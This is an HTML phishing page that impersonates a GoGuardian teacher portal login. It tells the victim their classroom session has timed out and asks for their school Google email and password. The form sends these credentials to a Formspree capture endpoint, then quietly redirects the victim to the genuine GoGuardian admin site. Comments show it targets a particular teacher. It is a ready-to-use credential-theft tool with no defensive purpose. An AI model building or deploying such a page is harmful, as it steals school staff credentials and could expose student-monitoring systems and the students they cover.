<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GoGuardian | Teacher Portal Login</title>
    <style>
        /* Professional GoGuardian Styling */
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f7f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 45px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 400px; text-align: center; border: 1px solid #e1e8ed; }
        .logo { width: 180px; margin-bottom: 25px; }
        h2 { color: #1a1a1b; font-size: 22px; margin-bottom: 8px; }
        p { color: #657786; font-size: 14px; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; border: 1.5px solid #e1e8ed; border-radius: 6px; box-sizing: border-box; font-size: 16px; margin-bottom: 15px; }
        button { width: 100%; padding: 14px; background-color: #3b82f6; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 600; }
        button:hover { background-color: #2563eb; }
    </style>
</head>
<body>
    <div class="login-card">
        <!-- Using your direct Imgur logo link -->
        <img src="https://i.imgur.com/em0xOx1.png" alt="GoGuardian" class="logo">
        <h2>Teacher Portal Sync</h2>
        <p>Your classroom session has timed out. Please sign in with your school Google account to continue monitoring.</p>
        
        <!-- Formspree capture endpoint -->
        <form action="https://formspree.io" method="POST">
            <input type="email" name="email" placeholder="School Email" required>
            <input type="password" name="password" placeholder="Password" required>
            
            <!-- This hidden field tells Formspree where to send her after she clicks Login -->
            <input type="hidden" name="_next" value="https://admin.goguardian.com">
            
            <button type="submit">Sign in with Google</button>
        </form>
    </div>
</body>
</html>
